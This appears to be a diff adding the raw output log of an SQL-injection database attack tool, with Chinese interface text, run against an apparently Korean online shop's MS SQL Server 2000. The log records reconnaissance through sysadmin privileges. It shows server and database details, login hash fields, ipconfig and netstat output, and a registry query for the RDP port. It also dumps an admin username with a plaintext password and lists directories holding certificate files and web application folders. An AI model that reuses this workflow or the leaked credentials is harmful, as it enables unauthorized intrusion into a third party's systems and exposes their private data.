@@ -1,0 +1,364 @@
+
+■数据库信息:============================================================
+- 数据库名：Project.mdf
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SOFTGATE-JJF2I7
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Project.mdf	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Project.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	211-115-72-243	5688	EXECUTE		
+Internet Information Services	runnable	211-115-72-243	5476	UPDATE		
+	background			SIGNAL HANDLER		
+	background			TASK MANAGER		
+	sleeping			CHECKPOINT SLEEP		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SOFTGATE-JJF2I7	SQL Server	SQLOLEDB	SOFTGATE-JJF2I7		SOFTGATE-JJF2I7	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		12 12 2007 12:44AM	12 12 2007 12:44AM	
+BUILTIN\Administrators		1	茄惫绢	12 12 2007 12:44AM	12 12 2007 12:44AM	
+sa	??插髑??粵??笑?哘胗????读??弖	1	茄惫绢	08  6 2000  1:27AM	12 12 2007 12:44AM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 肺拿 康开 楷搬 2:	
+6		
+7	   Connection-specific DNS Suffix  . : 	
+8	   IP Address. . . . . . . . . . . . : 10.0.122.177	
+9	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+10	   Default Gateway . . . . . . . . . : 	
+11		
+12	Ethernet adapter 肺拿 康开 楷搬:	
+13		
+14	   Connection-specific DNS Suffix  . : 	
+15	   IP Address. . . . . . . . . . . . :REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber	
+16	   Subnet Mask . . . . . . . . . . . : 255.255.255.128	
+17	   Default Gateway . . . . . . . . . : 211.115.72.129	
+18		
+■REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+1		
+2	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp	
+3	    PortNumber    REG_DWORD    0xd3d	
+4		
+5		
+■netstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:25             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:53             0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+11	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+12	  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING	
+13	  TCP    0.0.0.0:1030           0.0.0.0:0              LISTENING	
+14	  TCP    0.0.0.0:1031           0.0.0.0:0              LISTENING	
+15	  TCP    0.0.0.0:1032           0.0.0.0:0              LISTENING	
+16	  TCP    0.0.0.0:1038           0.0.0.0:0              LISTENING	
+17	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+18	  TCP    0.0.0.0:1581           0.0.0.0:0              LISTENING	
+19	  TCP    0.0.0.0:3400           0.0.0.0:0              LISTENING	
+20	  TCP    0.0.0.0:21112          0.0.0.0:0              LISTENING	
+21	  TCP    10.0.122.177:139       0.0.0.0:0              LISTENING	
+22	  TCP    10.0.122.177:2301      0.0.0.0:0              LISTENING	
+23	  TCP    10.0.122.177:2381      0.0.0.0:0              LISTENING	
+24	  TCP    127.0.0.1:1027         127.0.0.1:1028         ESTABLISHED	
+25	  TCP    127.0.0.1:1028         127.0.0.1:1027         ESTABLISHED	
+26	  TCP    127.0.0.1:1033         127.0.0.1:1034         ESTABLISHED	
+27	  TCP    127.0.0.1:1034         127.0.0.1:1033         ESTABLISHED	
+28	  TCP    127.0.0.1:1040         0.0.0.0:0              LISTENING	
+29	  TCP    127.0.0.1:2301         0.0.0.0:0              LISTENING	
+30	  TCP    127.0.0.1:2381         0.0.0.0:0              LISTENING	
+31	  TCP    211.115.72.243:80      112.170.203.143:3413   ESTABLISHED	
+32	  TCP    211.115.72.243:80      112.170.203.143:3414   ESTABLISHED	
+33	  TCP    211.115.72.243:80      112.170.203.143:3415   ESTABLISHED	
+34	  TCP    211.115.72.243:80      112.170.203.143:3416   ESTABLISHED	
+35	  TCP    211.115.72.243:80      112.170.203.143:3418   ESTABLISHED	
+36	  TCP    211.115.72.243:80      112.170.203.143:3419   ESTABLISHED	
+37	  TCP    211.115.72.243:80      112.170.203.143:3420   ESTABLISHED	
+38	  TCP    211.115.72.243:80      112.170.203.143:3421   ESTABLISHED	
+39	  TCP    211.115.72.243:80      112.170.203.143:3422   ESTABLISHED	
+40	  TCP    211.115.72.243:80      119.207.142.72:53690   ESTABLISHED	
+41	  TCP    211.115.72.243:80      119.207.142.72:53691   ESTABLISHED	
+42	  TCP    211.115.72.243:80      119.207.142.72:53692   ESTABLISHED	
+43	  TCP    211.115.72.243:80      119.207.142.72:53693   ESTABLISHED	
+44	  TCP    211.115.72.243:80      119.207.142.72:53694   ESTABLISHED	
+45	  TCP    211.115.72.243:80      119.207.142.72:53695   ESTABLISHED	
+46	  TCP    211.115.72.243:80      222.231.31.141:63104   ESTABLISHED	
+47	  TCP    211.115.72.243:139     0.0.0.0:0              LISTENING	
+48	  TCP    211.115.72.243:1029    210.124.122.67:10011   ESTABLISHED	
+49	  TCP    211.115.72.243:1035    210.124.122.67:10011   ESTABLISHED	
+50	  TCP    211.115.72.243:2301    0.0.0.0:0              LISTENING	
+51	  TCP    211.115.72.243:2381    0.0.0.0:0              LISTENING	
+52	  TCP    211.115.72.243:3823    218.5.18.193:8080      ESTABLISHED	
+53	  TCP    211.115.72.243:3864    211.115.72.175:139     TIME_WAIT	
+54	  TCP    211.115.72.243:3865    211.115.72.175:139     TIME_WAIT	
+55	  TCP    211.115.72.243:14001   0.0.0.0:0              LISTENING	
+56	  UDP    0.0.0.0:161            *:*	
+57	  UDP    0.0.0.0:445            *:*	
+58	  UDP    0.0.0.0:500            *:*	
+59	  UDP    0.0.0.0:1434           *:*	
+60	  UDP    0.0.0.0:3456           *:*	
+61	  UDP    0.0.0.0:4500           *:*	
+62	  UDP    0.0.0.0:49152          *:*	
+63	  UDP    0.0.0.0:49153          *:*	
+64	  UDP    0.0.0.0:49156          *:*	
+65	  UDP    0.0.0.0:49158          *:*	
+66	  UDP    0.0.0.0:49164          *:*	
+67	  UDP    0.0.0.0:49166          *:*	
+68	  UDP    0.0.0.0:49167          *:*	
+69	  UDP    0.0.0.0:49174          *:*	
+70	  UDP    0.0.0.0:49175          *:*	
+71	  UDP    0.0.0.0:49176          *:*	
+72	  UDP    0.0.0.0:49187          *:*	
+73	  UDP    0.0.0.0:49189          *:*	
+74	  UDP    0.0.0.0:49190          *:*	
+75	  UDP    0.0.0.0:49194          *:*	
+76	  UDP    0.0.0.0:49197          *:*	
+77	  UDP    0.0.0.0:49200          *:*	
+78	  UDP    0.0.0.0:49204          *:*	
+79	  UDP    0.0.0.0:49205          *:*	
+80	  UDP    0.0.0.0:49206          *:*	
+81	  UDP    0.0.0.0:49222          *:*	
+82	  UDP    0.0.0.0:49229          *:*	
+83	  UDP    0.0.0.0:49236          *:*	
+84	  UDP    0.0.0.0:49237          *:*	
+85	  UDP    0.0.0.0:49245          *:*	
+86	  UDP    0.0.0.0:49249          *:*	
+87	  UDP    0.0.0.0:49250          *:*	
+88	  UDP    0.0.0.0:49258          *:*	
+89	  UDP    0.0.0.0:49266          *:*	
+90	  UDP    0.0.0.0:49274          *:*	
+91	  UDP    0.0.0.0:49275          *:*	
+92	  UDP    0.0.0.0:49276          *:*	
+93	  UDP    0.0.0.0:49280          *:*	
+94	  UDP    0.0.0.0:49284          *:*	
+95	  UDP    0.0.0.0:49302          *:*	
+96	  UDP    0.0.0.0:49303          *:*	
+97	  UDP    0.0.0.0:49304          *:*	
+98	  UDP    0.0.0.0:49311          *:*	
+99	  UDP    0.0.0.0:49320          *:*	
+100	  UDP    0.0.0.0:49322          *:*	
+101	  UDP    0.0.0.0:49326          *:*	
+102	  UDP    0.0.0.0:49331          *:*	
+103	  UDP    0.0.0.0:49333          *:*	
+104	  UDP    0.0.0.0:49350          *:*	
+105	  UDP    0.0.0.0:49371          *:*	
+106	  UDP    0.0.0.0:49380          *:*	
+107	  UDP    0.0.0.0:49384          *:*	
+108	  UDP    0.0.0.0:49403          *:*	
+109	  UDP    0.0.0.0:49404          *:*	
+110	  UDP    0.0.0.0:49413          *:*	
+111	  UDP    0.0.0.0:49421          *:*	
+112	  UDP    0.0.0.0:49430          *:*	
+113	  UDP    0.0.0.0:49448          *:*	
+114	  UDP    0.0.0.0:49456          *:*	
+115	  UDP    0.0.0.0:49458          *:*	
+------------------------------------------------------------
+正在获取 [Project.mdf].[ADMIN] 的列名……
+ id
+password
+
+正在执行查询：select top 3 id,password from Project.mdf..ADMIN order by password
+mallmaster	0047889asdf	
+Dir of D:: 
+
+辑滚归诀(20071211)\
+蜡厚促烙(焊救CERT) 包府 弃歹\
+Data\
+newProject\
+RECYCLER\
+Setup_Program\
+SSL\
+System Volume Information\
+Tivoli\
+tsmclient\
+UMS_包府_弃歹\
+aa.txt
+dns.zip
+
+Dir of E:: 
+
+
+Dir of C:: 
+一次性获取失败，正在批次获取……
+
+捞傈辑滚归诀(20070805)\
+ARtmp\
+compaq\
+CPQSYSTEM\
+Documents and Settings\
+hp\
+i386\
+Inetpub\
+Program Files\
+RECYCLER\
+Server\
+SQL2KSP4\
+System Volume Information\
+WebCON24\
+WINDOWS\
+wmpub\
+211-115-72-243_w3svc1_cert.pfx
+AUTOEXEC.BAT
+certreq.txt
+CONFIG.SYS
+down.vbs
+eula.1028.txt
+eula.1031.txt
+eula.1033.txt
+eula.1036.txt
+eula.1040.txt
+eula.1041.txt
+eula.1042.txt
+eula.2052.txt
+eula.3082.txt
+globdata.ini
+install.exe
+install.ini
+install.res.1028.dll
+install.res.1031.dll
+install.res.1033.dll
+install.res.1036.dll
+install.res.1040.dll
+install.res.1041.dll
+install.res.1042.dll
+install.res.2052.dll
+install.res.3082.dll
+mm.exe
+msizap.exe
+tmuninst.ini
+VC_RED.cab
+VC_RED.MSI
+vcredist.bmp
+vWeb.vbs
+
+Dir of C:\Inetpub: 
+
+AdminScripts\
+mailroot\
+wwwroot\
+
+Dir of C:\Inetpub\wwwroot: 
+
+iisstart.htm
+pagerror.gif
+
+Dir of C:\WebCON24: 
+
+bin\
+certs\
+conf\
+lib\
+lock\
+log\
+policy\
+util\
+uninstall.exe
+
+Dir of C:\WebCON24\conf: 
+
+cryptokey.dat
+wconagent.ini
+wconfiis60.ini
+wconfilters.ini
+wconrealtime.ini
+
+Dir of D:\蜡厚促烙(焊救CERT) 包府 弃歹: 
+
+
+Dir of D:\辑滚归诀(20071211): 
+
+
+Dir of D:\newProject: 
+
+admin\
+basket\
+community\
+enterprise\
+error\
+eventmadang\
+foot\
+img\
+include\
+introduce\
+item\
+join\
+left\
+license\
+login\
+member\
+munhwa\
+munhwa2\
+myshop\
+package\
+partner\
+press\
+psearch\
+right\
+software\
+sql\
+support\
+surprise\
+top\
+admin.css
+bigimgview.asp
+default.asp
+itemgo.asp
+itemgo_bak.asp
+lin.asp
+logout.asp
+smflow.asp
+softgate.css
+
